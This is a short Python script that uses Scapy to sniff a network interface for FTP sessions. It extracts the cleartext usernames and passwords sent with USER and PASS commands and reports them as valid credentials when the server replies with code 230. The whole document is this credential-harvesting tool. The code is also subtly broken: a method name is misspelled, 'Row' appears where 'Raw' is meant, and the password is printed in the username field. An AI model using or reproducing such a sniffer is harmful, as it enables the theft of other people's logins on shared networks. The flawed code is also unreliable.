#!/usr/bin/env python

import sys
from logging import getLogger, ERROR

getLogger('Scapy.runtime').setLevel(ERROR)

try:
    from scapy.all import *
except ImportError:
    print('[!] Error: Scapy INstallation Not Found')
    sys.exit()

interface = sys.argv[1]

username = ['Error: Unlucky Timing']

usernames = ['Error: Unlucky Timing']
passwords = ['Error: Unlucky TIming']


def check_login(pkt, username, password):
    try:
        if '230' in pkt[Raw].load:
            print('[*] Valid Crredentials Found....')
            print('\t[*] ' + str(pkt[IP].dst).strip() + ' -> ' + str(pkt[IP].src).strip() + ':')
            print('\t   [*] Username: ' + password)
            print('\t   [*] Password: ' + password + '\n')
            return
        else:
            return
    except Exception:
        return

def check_for_ftp(pkt):
    if pkt.haslayler(TCP) and pkt.haslayler(Raw):
        if pkt[TCP].dport == 21 or pkt[TCP].sport == 21:
            return True
        else:
            return False

def check_pkt(pkt):
    if check_for_ftp(pkt):
        pass
    else:
        return
    data = pkt[Row].load
    if 'USER '  in data:
        usernames.append(data.split('USER ')[1].strip())
    elif 'PASS' in data:
        passwords.append(data.split('PASS ')[1].strip())
    else:
        check_login(pkt, usernames[-1], passwords[-1])
    return

print('[*] Sniffing Started on %s...\n' % interface)
try:
    sniff(iface=interface, prn=check_pkt, store=0)
except Exception:
    print('[*] Error: Failed is Initialize Sniffing')
    sys.exit()

print('\n[*] Sniffing Stopped')